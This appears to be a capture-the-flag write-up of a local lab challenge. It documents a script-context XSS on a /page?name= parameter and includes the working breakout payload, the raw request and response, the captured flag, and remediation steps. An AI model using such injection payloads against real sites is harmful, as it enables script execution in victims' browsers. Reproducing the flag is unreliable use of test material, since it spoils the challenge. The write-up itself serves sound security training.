## TL;DR
- Objective: Execute an XSS with the string 'XSS' (capital) - specifically alert('XSS')
- Outcome: SUCCESSFULLY ACHIEVED
- Highest-impact finding: DOM-based XSS via unsanitized JavaScript string interpolation
- Validation status: FLAG captured via successful exploitation

## Target Information
- Target: 127.0.0.1:32963
- Host / base URL: http://127.0.0.1:32963
- Application or component: "Dalgona Challenges" CTF application
- Authentication context: None required (fully open)
- Relevant technology details: Flask/Werkzeug backend, x-xss-protection: 0

## Confirmed Vulnerability
### DOM-based Cross-Site Scripting (XSS)
- Affected endpoint / component: GET /page?name=
- Impact: Arbitrary JavaScript execution in victim's browser context
- Preconditions: No authentication required; attacker only needs to entice victim to visit malicious URL
- Exact payload or PoC: `";alert("XSS");//`

Payload breakdown:
- `"` - Closes the existing JavaScript string literal
- `;` - Terminates the current statement
- `alert("XSS")` - Executes the target JavaScript payload
- `//` - JavaScript comment syntax to neutralize trailing code

In vulnerable context:
```html
<script> var name = "";alert("XSS");//"; document.write('Hello ' + name); </script>
```

## Steps to Reproduce
1. Navigate to the vulnerable endpoint: http://127.0.0.1:32963/page
2. Append the malicious payload to the `name` parameter: `?name=%22;alert(%22XSS%22);//`
3. Send the GET request (browser or CLI tool)
4. Observe the JavaScript alert('XSS') popup executing in the browser context
5. The CTF framework confirms success and displays the flag

## Validation / Evidence
- Validation token / flag: `FLAG{fb4b5a2a1e1fdd7900ea5f06ebde8ab05f19358b1d3d2081a39566fb0e27a497}`
- Tool evidence: Manual exploitation via crafted HTTP GET request
- Request evidence:
```
GET /page?name=%22;alert(%22XSS%22);// HTTP/1.1
Host: 127.0.0.1:32963
```
- Response evidence:
```html
<div class="solution-text"><img src="static/img/cookies/success_circle.png" alt="Correct" width="150" height="150"><br>Congratulations!<p> Here is the flag: FLAG{fb4b5a2a1e1fdd7900ea5f06ebde8ab05f19358b1d3d2081a39566fb0e27a497}</div>
```
- Notes on reliability / limitations: 
  - Vulnerability is 100% reliable
  - No authentication or session requirements
  - Direct DOM-based XSS with immediate execution
  - Payload works with standard URL encoding (%22 for double quote)

## Remediation
- Root cause: User-supplied input from the `name` GET parameter is directly interpolated into a JavaScript string literal without sanitization, encoding, or validation. The code pattern `var name = "USER_INPUT";` creates an injection sink.
- Recommended fix:
  1. Use proper HTML/JavaScript encoding functions (e.g., encodeURIComponent() or framework-specific output encoding) before inserting user input into JavaScript contexts
  2. Implement a Content Security Policy (CSP) with strict script-src directives
  3. Consider using safe DOM manipulation methods that don't use `document.write()` or inline string concatenation
  4. Validate the `name` parameter against an allowlist of safe characters
- Defense-in-depth:
  - Enable X-XSS-Protection header (currently explicitly disabled with `x-xss-protection: 0`)
  - Implement strict CSP headers preventing inline script execution
  - Use modern JavaScript frameworks with built-in XSS protection

## How to Verify the Fix
1. Submit the original payload: `GET /page?name=%22;alert(%22XSS%22);//`
2. Expected secure result: 
   - The payload should be rendered as literal text without JavaScript execution
   - The response should show: `var name = "\";alert(\"XSS\");//";` (properly escaped)
   - No alert popup should appear
   - The "Congratulations" success message should NOT appear
3. Verify safe alternative: `GET /page?name=Test` should display "Hello Test" safely

## Remaining Leads
- Confirmed blockers: None - exploitation was successful
- Unverified leads: None
- Missing context: None - all required information was gathered and task completed successfully
